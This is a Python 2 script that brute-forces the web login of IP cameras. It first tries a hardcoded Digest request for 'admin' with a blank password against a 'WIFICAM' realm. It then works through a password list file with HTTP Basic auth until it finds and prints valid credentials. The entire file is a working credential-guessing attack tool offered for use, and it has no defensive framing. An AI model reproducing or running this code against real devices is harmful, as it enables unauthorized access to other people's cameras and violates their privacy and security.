def breaker(host,port):
    import socket
    import urllib2
    import base64

    print " Attack: " + host + ":" + port + '\n'
    account = open('cam/passlist.txt', 'r')

    global truer
    global blanker

    truer = 0
    blanker = 0
    while (truer == 0):
        def withblank():
            #admin
            #Administrator
            #root

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))

            s.sendall('GET http://' + str(host) + ':' + str(port) + ' HTTP/1.1\r\nHost: ' + str(host) + '\r\nConnection: keep-alive\r\nAuthorization: Digest username="admin", realm="WIFICAM", nonce="d35629bc80babfca49d6090c23707ebe", uri="/login.cgi", algorithm=MD5, response="d603017bdabcebf010d29061c886889f", opaque="5ccc069c403ebaf9f0171e9517f40e41", qop=auth, nc=00000008, cnonce="a0aa6a496020664f"\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nAccept: */*\r\nReferer: http://' + str(host) + ':' + str(port) + '/index1.html\r\nAccept-Encoding: gzip, deflate, sdch\r\nAccept-Language: es-ES,es;q=0.8\r\n\r\n')
            
            if ("HTTP/1.1 302 Redirect" in str(s.recv(2000))):
                print "\n The correct password is: admin:<blank>"
                global truer
                truer = 1
            else:
                print  " incorrect password: admin:<blank>"

            global blanker
            blanker = 1

        def nonblank():
            try:
                user_acc, password= account.next().rstrip("\n").split(":")
            except:
                print "\n any password of the passlist is the corrrect"
                exit()

            request = urllib2.Request('http://' + str(host) + ':' + str(port) + '/')
            base64string = base64.encodestring('%s:%s' % (user_acc, password)).replace('\n', '')

            request.add_header("Authorization", "Basic %s" % base64string)

            try:
                result = urllib2.urlopen(request)
                print "\n\n The correct password is: " + user_acc + ":" + password
                global truer
                truer = 1
            except:
                print " incorrect password: " + user_acc + ":" + password

        if (blanker < 1):
            withblank()
        else:
            nonblank()